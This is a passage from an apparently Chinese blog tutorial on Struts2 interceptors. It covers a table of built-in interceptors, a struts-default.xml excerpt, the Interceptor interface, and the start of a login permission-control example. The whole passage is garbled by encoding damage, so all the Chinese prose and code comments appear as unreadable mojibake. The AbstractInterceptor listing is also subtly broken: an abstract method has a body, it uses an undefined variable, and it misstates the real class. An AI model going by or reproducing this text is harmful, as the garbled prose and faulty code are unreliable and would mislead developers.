class="hljs-comment">&lt;!--ä¸Šé¢é…ç½®äº†æ‹¦æˆªå™¨æ ˆï¼Œä½†æ˜¯æ²¡æœ‰è¢«æ‰§è¡Œ...ä¸‹é¢é…ç½®æ‰§è¡Œæ‹¦æˆªå™¨--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default-interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mystack&quot;</span>/&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;TestAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;TestAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;execute&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="å†…å»ºæ‹¦æˆªå™¨"><a href="#å†…å»ºæ‹¦æˆªå™¨" class="headerlink" title="å†…å»ºæ‹¦æˆªå™¨"></a>å†…å»ºæ‹¦æˆªå™¨</h2><p>æ‹¦æˆªå™¨éƒ½ç»§æ‰¿AbstractInterceptor</p><p>Struts2 æ¡†æ¶ä¸­å†…ç½®äº†è®¸å¤šæ‹¦æˆªå™¨ï¼Œè¿™äº›æ‹¦æˆªå™¨ä»¥ name-class å¯¹çš„å½¢å¼é…ç½®åœ¨ struts-default.xml æ–‡ä»¶ä¸­ï¼Œå…¶ä¸­ï¼Œname æ˜¯æ‹¦æˆªå™¨çš„åç§°ï¼Œä¹Ÿå°±æ˜¯å¼•ç”¨çš„åå­—ï¼›class æŒ‡å®šäº†è¯¥æ‹¦æˆªå™¨æ‰€å¯¹åº”çš„å®ç°ã€‚</p><p>åªè¦è‡ªå®šä¹‰çš„åŒ…ç»§æ‰¿äº† Struts2 çš„ struts-default åŒ…ï¼Œå°±å¯ä»¥ä½¿ç”¨åŒ…ä¸­å®šä¹‰çš„å†…å»ºæ‹¦æˆªå™¨ï¼Œå¦åˆ™éœ€è¦è‡ªè¡Œå®šä¹‰æ‹¦æˆªå™¨ã€‚</p><p>å†…å»ºæ‹¦æˆªå™¨ä»‹ç»:</p><table><thead><tr><th>åç§°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>alias</td><td>åœ¨ä¸åŒè¯·æ±‚ä¹‹é—´å°†è¯·æ±‚å‚æ•°åœ¨ä¸åŒåç§°é—´è½¬æ¢ï¼Œè¯·æ±‚å†…å®¹ä¸å˜</td></tr><tr><td>autowiring</td><td>ç”¨äºå®ç° Action çš„è‡ªåŠ¨è£…é…</td></tr><tr><td>chain</td><td>è®©å‰ä¸€ä¸ª Action çš„å±æ€§å¯ä»¥è¢«åä¸€ä¸ª Action è®¿é—®ï¼Œç°åœ¨å’Œ chain ç±»å‹çš„ result() ç»“åˆä½¿ç”¨</td></tr><tr><td>conversionError</td><td>å°†é”™è¯¯ä» ActionContext ä¸­æ·»åŠ åˆ° Action çš„å±æ€§å­—æ®µä¸­</td></tr><tr><td>cookies</td><td>ä½¿ç”¨é…ç½®çš„ Name å’Œ Value æŒ‡å®š Cookies</td></tr><tr><td>cookieProvider</td><td>è¯¥ç±»æ˜¯ä¸€ä¸ª Cookie å·¥å…·ï¼Œæ–¹ä¾¿å¼€å‘è€…å‘å®¢æˆ·ç«¯å†™ Cookie</td></tr><tr><td>clearSession</td><td>ç”¨äºæ¸…é™¤ä¸€ä¸ª HttpSession å®ä¾‹</td></tr><tr><td>createSession</td><td>è‡ªåŠ¨åˆ›å»º HttpSessionï¼Œç”¨äºä¸ºéœ€è¦ä½¿ç”¨</td></tr><tr><td>HttpSession</td><td>çš„æ‹¦æˆªå™¨æœåŠ¡</td></tr><tr><td>debugging</td><td>æä¾›ä¸åŒçš„è°ƒè¯•ç”¨çš„é¡µé¢å±•ç°å†…éƒ¨çš„æ•°æ®çŠ¶å†µ</td></tr><tr><td>execAndWait</td><td>åœ¨åå°æ‰§è¡Œ Actionï¼ŒåŒæ—¶å°†ç”¨æˆ·å¸¦åˆ°ä¸€ä¸ªä¸­é—´çš„ç­‰å¾…é¡µé¢</td></tr><tr><td>exception</td><td>å°†å¼‚å¸¸å®šä½åˆ°ä¸€ä¸ªç”»é¢</td></tr><tr><td>fileUpload</td><td>æä¾›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</td></tr><tr><td>il8n</td><td>è®°å½•ç”¨æˆ·é€‰æ‹©çš„ locale</td></tr><tr><td>logger</td><td>è¾“å‡º Action çš„åç§°</td></tr><tr><td>model-driven</td><td>å¦‚æœä¸€ä¸ªç±»å®ç°äº† Model Drivenï¼Œå°† get Model å¾—åˆ°çš„ç»“æœæ”¾åœ¨ Value Slack ä¸­</td></tr><tr><td>scoped-model-driven</td><td>å¦‚æœä¸€ä¸ª Action å®ç°äº†</td></tr><tr><td>params</td><td>å°†è¯·æ±‚ä¸­çš„å‚æ•°è®¾ç½®åˆ° Action ä¸­</td></tr><tr><td>actionMappingParams</td><td>ç”¨äºè´Ÿè´£åœ¨ Action é…ç½®ä¸­ä¼ é€’å‚æ•°</td></tr><tr><td>prepare</td><td>å¦‚æœ Action å®ç°äº† Preparableï¼Œåˆ™è¯¥æ‹¦æˆªå™¨è°ƒç”¨ Action ç±»çš„ prepare æ–¹æ³•</td></tr><tr><td>staticParams</td><td>å°† struts.xml æ–‡ä»¶ä¸­ æ ‡ç­¾çš„å‚æ•°å†…å®¹è®¾ç½®åˆ°å¯¹åº”çš„ Action ä¸­</td></tr><tr><td>scope</td><td>å°† Action çŠ¶æ€å­˜å…¥ session å’Œ application èŒƒå›´</td></tr><tr><td>servletConfig</td><td>æä¾›è®¿é—® HttpServletRequest å’Œ HttpServletResponse æ–¹æ³•ï¼Œä»¥ Map æ–¹å¼è®¿é—®</td></tr><tr><td>timer</td><td>è¾“å²€ Action æ‰§è¡Œçš„æ—¶é—´</td></tr><tr><td>token</td><td>é€šè¿‡ Token é¿å…åŒå‡»</td></tr><tr><td>tokenSession</td><td>å’Œ Token Interceptor ä¸€æ ·ï¼Œä¸è¿‡åŒå‡»æ—¶æŠŠè¯·æ±‚çš„æ•°æ®å­˜å‚¨åœ¨ Session ä¸­</td></tr><tr><td>validation</td><td>ä½¿ç”¨ action-validation.xml æ–‡ä»¶ä¸­å®šä¹‰çš„å†…å®¹æ ¡éªŒæäº¤çš„æ•°æ®</td></tr><tr><td>workflow</td><td>è°ƒç”¨ Action çš„ validate æ–¹æ³•ï¼Œä¸€æ—¦æœ‰é”™è°‹è¿”å›ï¼Œåˆ™é‡æ–°å®šä½åˆ° INPUT ç”»é¢</td></tr><tr><td>store</td><td>å­˜å‚¨æˆ–è€…è®¿é—®å®ç° ValidalionAware æ¥å£çš„ Action ç±»å‡ºç°çš„æ¶ˆæ¯ã€é”™è¯¯å’Œå­—æ®µé”™è¯¯ç­‰</td></tr><tr><td>checkbox</td><td>æ·»åŠ äº† checkbox è‡ªåŠ¨å¤„ç†ä»£ç ï¼Œå°†æ²¡æœ‰é€‰ä¸­çš„ checkbox çš„å†…å®¹è®¾å®šä¸º falseï¼Œè€Œ html åœ¨é»˜è®¤æƒ…å†µä¸‹ä¸æäº¤æ²¡æœ‰é€‰ä¸­çš„ checkbox</td></tr><tr><td>datetime</td><td>æ—¥æœŸæ‹¦æˆªå™¨</td></tr><tr><td>profiling</td><td>é€šè¿‡å‚æ•°æ¿€æ´» profile</td></tr><tr><td>roles</td><td>ç¡®å®šç”¨æˆ·æ˜¯å¦å…·æœ‰ JAAS æŒ‡å®šçš„ Roleï¼Œå¦åˆ™ä¸äºˆæ‰§è¡Œ</td></tr><tr><td>annotationWorkflow</td><td>åˆ©ç”¨æ³¨è§£ä»£æ›¿ XML é…ç½®</td></tr><tr><td>multiselect</td><td>æ£€æµ‹æ˜¯å¦æœ‰åƒ æ ‡ç­¾ä¸€æ ·è¢«é€‰ä¸­çš„å¤šä¸ªå€¼ï¼Œç„¶åæ·»åŠ ä¸€ä¸ªç©ºå‚æ•°</td></tr><tr><td>deprecation</td><td>å½“æ—¥å¿—çº§åˆ«è®¾ç½®ä¸ºè°ƒè¯•æ¨¡å¼ï¼ˆdebugï¼‰å¹¶ä¸”æ²¡æœ‰ç‰¹æ®Šå‚æ•°æ—¶ï¼Œåœ¨ devMode</td></tr></tbody></table><p>åœ¨ struts-core-2.3.24.jar åŒ…ä¸­çš„æ ¹ç›®å½•ä¸‹æ‰¾åˆ° struts-default.xml æ–‡ä»¶ï¼Œæ‰“å¼€åæ‰¾åˆ° å…ƒç´ ä¸‹çš„å†…å»ºæ‹¦æˆªå™¨å’Œæ‹¦æˆªå™¨æ ˆï¼Œå…¶éƒ¨åˆ†ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts-default&quot;</span> <span class="hljs-attr">abstract</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>    ...<br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--ç³»ç»Ÿå†…å»ºæ‹¦æˆªå™¨éƒ¨åˆ†ï¼Œä¸Šä¸€éƒ¨åˆ†ä»‹ç»çš„å†…å®¹--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;alias&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.interceptor.AliasInterceptor&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autowiring&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.spring.interceptor.ActionAutowiringInterceptor&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;chain&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.interceptor.ChainingInterceptor&quot;</span>/&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!-- å®šä¹‰Basic stackæ‹¦æˆªå™¨æ ˆ --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicStack&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--å¼•ç”¨ç³»ç»Ÿå®šä¹‰çš„exceptionæ‹¦æˆªå™¨--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exception&quot;</span>/&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!-- å®šä¹‰Sample model -driven stack --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;modelDrivenStack&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--å¼•ç”¨ç³»ç»Ÿå®šä¹‰çš„modelDrivenæ‹¦æˆªå™¨--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;modelDriven&quot;</span>/&gt;</span><br>            <span class="hljs-comment">&lt;!--å¼•ç”¨ç³»ç»Ÿå®šä¹‰çš„basicStackæ‹¦æˆªå™¨æ ˆ--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicStack&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!--å®šä¹‰defaultStackæ‹¦æˆªå™¨æ ˆ--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exception&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;alias&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;il8n&quot;</span>/&gt;</span><br>            ...<br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;validation&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;excludeMethods&quot;</span>&gt;</span>input,back,cancel,browse<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-ref</span>&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--å°†defaulrStackæ‹¦æˆªå™¨æ ˆé…ç½®ä¸ºç³»ç»Ÿé»˜è®¤æ‹¦æˆªå™¨æ ˆ--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default-interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--é»˜è®¤actionç±»æ˜¯ActionSupport--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default-class-ref</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.ActionSupport&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šè¿°å†…å»ºæ‹¦æˆªå™¨çš„é…ç½®ä»£ç ä¸­ï¼ŒdefaultStack æ‹¦æˆªå™¨ç»„åˆäº†å¤šä¸ªæ‹¦æˆªå™¨ï¼Œè¿™äº›æ‹¦æˆªå™¨å¯ä»¥æ»¡è¶³å¤§éƒ¨åˆ† Web åº”ç”¨ç¨‹åºçš„éœ€æ±‚ã€‚ä½¿ç”¨æ—¶ï¼Œåªè¦åœ¨ struts.xml å®šä¹‰åŒ…çš„è¿‡ç¨‹ä¸­ç»§æ‰¿ struts-default åŒ…ï¼Œé‚£ä¹ˆ defaultStack æ‹¦æˆªå™¨æ ˆå°±æ˜¯é»˜è®¤æ‹¦æˆªå™¨çš„å¼•ç”¨ã€‚</p><h2 id="è‡ªå®šä¹‰æ‹¦æˆªå™¨"><a href="#è‡ªå®šä¹‰æ‹¦æˆªå™¨" class="headerlink" title="è‡ªå®šä¹‰æ‹¦æˆªå™¨"></a>è‡ªå®šä¹‰æ‹¦æˆªå™¨</h2><p>   åœ¨å®é™…çš„é¡¹ç›®å¼€å‘ä¸­ï¼ŒStruts2çš„å†…ç½®æ‹¦æˆªå™¨å¯ä»¥å®Œæˆå¤§éƒ¨åˆ†çš„æ‹¦æˆªä»»åŠ¡ï¼Œä½†æ˜¯ï¼Œä¸€äº›ä¸ç³»ç»Ÿé€»è¾‘ç›¸å…³çš„é€šç”¨åŠŸèƒ½ï¼ˆå¦‚æƒé™çš„æ§åˆ¶ã€ç”¨æˆ·ç™»å½•æ§åˆ¶ç­‰ï¼‰ï¼Œåˆ™éœ€è¦é€šè¿‡è‡ªå®šä¹‰æ‹¦æˆªå™¨æ¥å®ç°ï¼Œè‡ªå®šä¹‰æ‹¦æˆªå™¨å…¶å®å°±æ˜¯å¼€å‘è‡ªå·±çš„æ‹¦æˆªå™¨ç±»ã€‚</p><p>è‡ªå®šä¹‰çš„æ‹¦æˆªå™¨ç±»ï¼Œéœ€è¦å®ç°import com.opensymphony.xwork2.interceptor.Interceptoræ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Interceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Serializable</span> </span>&#123;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span></span>;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>;<br> <br>    <span class="hljs-function">String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¯¥æ¥å£æä¾›äº†ä»¥ä¸‹ä¸‰ä¸ªæ–¹æ³•ï¼š</p><ul><li><p>void init():è¯¥æ–¹æ³•åœ¨æ‹¦æˆªå™¨è¢«åˆ›å»ºåä¼šç«‹å³è¢«è°ƒç”¨ï¼Œå®ƒåœ¨æ‹¦æˆªå™¨çš„ç”Ÿå‘½å‘¨æœŸå†…åªè¢«è°ƒç”¨ä¸€-æ¬¡ã€‚å¯ä»¥åœ¨è¯¥æ–¹æ³•ä¸­å¯¹ç›¸å…³èµ„æºè¿›è¡Œå¿…è¦çš„åˆå§‹åŒ–ã€‚</p></li><li><p>void destroy():è¯¥æ–¹æ³•ä¸init()æ–¹æ³•ç›¸å¯¹åº”ï¼Œåœ¨æ‹¦æˆªå™¨å®ä¾‹è¢«é”€æ¯ä¹‹å‰,å°†è°ƒç”¨è¯¥æ–¹æ³•æ¥é‡Šæ”¾ä¸æ‹¦æˆªå™¨ç›¸å…³çš„èµ„æºã€‚å®ƒåœ¨æ‹¦æˆªå™¨çš„ç”Ÿå‘½å‘¨æœŸå†…ä¹Ÿåªè¢«è°ƒç”¨ä¸€æ¬¡ã€‚</p></li><li><p>String intercept( ActionInvocation invocation) throws Exception: è¯¥æ–¹æ³•æ˜¯æ‹¦æˆªå™¨çš„æ ¸å¿ƒæ–¹æ³•,ç”¨æ¥æ·»åŠ çœŸæ­£æ‰§è¡Œæ‹¦æˆªå·¥ä½œçš„ä»£ç ï¼Œå®ç°å…·ä½“çš„æ‹¦æˆªæ“ä½œã€‚å®ƒè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºé€»è¾‘è§†å›¾ï¼Œç³»ç»Ÿæ ¹æ®è¿”å›çš„å­—ç¬¦ä¸²è·³è½¬åˆ°å¯¹åº”çš„è§†å›¾èµ„æºã€‚æ¯æ‹¦æˆªä¸€ä¸ªåŠ¨ä½œè¯·æ±‚ï¼Œè¯¥æ–¹æ³•å°±ä¼šè¢«è°ƒç”¨ä¸€æ¬¡ã€‚è¯¥æ–¹æ³•çš„ActionInvocationå‚æ•°åŒ…å«äº†è¢«æ‹¦æˆªçš„Actionçš„å¼•ç”¨,å¯ä»¥é€šè¿‡è¯¥å‚æ•°çš„invoke()æ–¹æ³•,å°†æ§åˆ¶æƒè½¬ç»™ä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨æˆ–è€…è½¬ç»™Actionçš„execute()æ–¹æ³•ã€‚</p></li></ul><p>å¦‚æœéœ€è¦è‡ªå®šä¹‰æ‹¦æˆªå™¨,åªéœ€è¦å®ç°Interceptoræ¥å£çš„ä¸‰ä¸ªæ–¹æ³•å³å¯ã€‚ç„¶è€Œåœ¨å®é™…å¼€å‘è¿‡ç¨‹ä¸­,é™¤äº†å®ç°Interceptoræ¥å£å¯ä»¥è‡ªå®šä¹‰æ‹¦æˆªå™¨å¤–,æ›´å¸¸ç”¨çš„ä¸€ç§æ–¹å¼æ˜¯ç»§æ‰¿æŠ½è±¡æ‹¦æˆªå™¨ç±»AbstractIntercepterã€‚</p><p>è¯¥ç±»å®ç°äº†Interceptor æ¥å£ï¼Œå¹¶ä¸”æä¾›äº†init()æ–¹æ³• å’Œdestroy()æ–¹æ³•çš„ç©ºå®ç°ã€‚ä½¿ç”¨æ—¶ï¼Œå¯ä»¥ç›´æ¥ç»§æ‰¿è¯¥æŠ½è±¡ç±»ï¼Œè€Œä¸ç”¨å®ç°é‚£äº›ä¸å¿…è¦çš„æ–¹æ³•â€æ‹¦æˆªå™¨ç±»AbstractInterceptorä¸­å®šä¹‰çš„æ–¹æ³•</p><p>å¦‚ä¸‹æ‰€ç¤º:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Interceptor</span> </span>&#123;<br> <br>     <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;æˆ‘æ˜¯æ‹¦æˆªå™¨çš„åˆå§‹åŒ–æ–¹æ³•&quot;</span>);<br>    &#125;<br>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;æˆ‘æ˜¯æ‹¦æˆªå™¨çš„é”€æ¯æ–¹æ³•&quot;</span>);<br>    &#125;<br> <br> <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;æˆ‘æ˜¯æ‹¦æˆªå™¨çš„æ‹¦æˆªæ–¹æ³•&quot;</span>);<br>        <span class="hljs-comment">//è°ƒç”¨invoke()æ–¹æ³•ï¼Œä»£è¡¨ç€æ”¾è¡Œæ‰§è¡Œä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œå¦‚æœæ²¡æœ‰æ‹¦æˆªå™¨äº†ï¼Œé‚£ä¹ˆå°±æ‰§è¡ŒActionçš„ä¸šåŠ¡ä»£ç </span><br>        <span class="hljs-comment">//å¯çœ‹æˆæ˜¯è¿‡æ»¤å™¨çš„doFilter()æ–¹æ³•</span><br>        actionInvocation.invoke();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>AbstractInterceptorç±»å®ç°äº†Interceptoræ¥å£çš„æ‰€æœ‰æ–¹æ³•ï¼Œåªéœ€ç»§æ‰¿AbstractInterceptorç±»ï¼Œå®ç°interceptor()æ–¹æ³•å°±å¯ä»¥åˆ›å»ºè‡ªå®šä¹‰æ‹¦æˆªå™¨ã€‚</p><h2 id="ä½¿ç”¨æ‹¦æˆªå™¨å®ç°æƒé™æ§åˆ¶"><a href="#ä½¿ç”¨æ‹¦æˆªå™¨å®ç°æƒé™æ§åˆ¶" class="headerlink" title="ä½¿ç”¨æ‹¦æˆªå™¨å®ç°æƒé™æ§åˆ¶"></a>ä½¿ç”¨æ‹¦æˆªå™¨å®ç°æƒé™æ§åˆ¶</h2><p>è‡ªå®šä¹‰ä¸€ä¸ªæ‹¦æˆªå™¨éœ€è¦ä¸‰æ­¥ï¼š</p><ol><li>è‡ªå®šä¹‰ä¸€ä¸ªå®ç°Interceptoræ¥å£ï¼ˆæˆ–è€…ç»§æ‰¿è‡ªAbstractInterceptorï¼‰çš„ç±»ã€‚</li><li>åœ¨strutx.xmlä¸­æ³¨å†Œä¸Šä¸€æ­¥ä¸­å®šä¹‰çš„æ‹¦æˆªå™¨ã€‚</li><li>åœ¨éœ€è¦ä½¿ç”¨çš„Actionä¸­å¼•ç”¨ä¸Šè¿°å®šä¹‰çš„æ‹¦æˆªå™¨ï¼Œä¸ºäº†æ–¹ä¾¿ä¹Ÿå¯å°†æ‹¦æˆªå™¨å®šä¹‰ä¸ºé»˜è®¤çš„æ‹¦æˆªå™¨ï¼Œè¿™æ ·åœ¨ä¸åŠ ç‰¹æ®Šå£°æ˜çš„æƒ…å†µä¸‹æ‰€æœ‰çš„Actionéƒ½è¢«è¿™ä¸ªæ‹¦æˆªå™¨æ‹¦æˆªã€‚</li></ol><p>æºä»£ç å¦‚ä¸‹ï¼š</p><p>User.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.domain;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-keyword">private</span> String username; <span class="hljs-comment">//ç”¨æˆ·å</span><br><span class="hljs-keyword">private</span> String password; <span class="hljs-comment">//å¯†ç </span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> username;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.username = username;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> password;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.password = password;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User [username=&quot;</span> + username + <span class="hljs-string">&quot;, password=&quot;</span> + password + <span class="hljs-string">&quot;]&quot;</span>;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>LoginAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 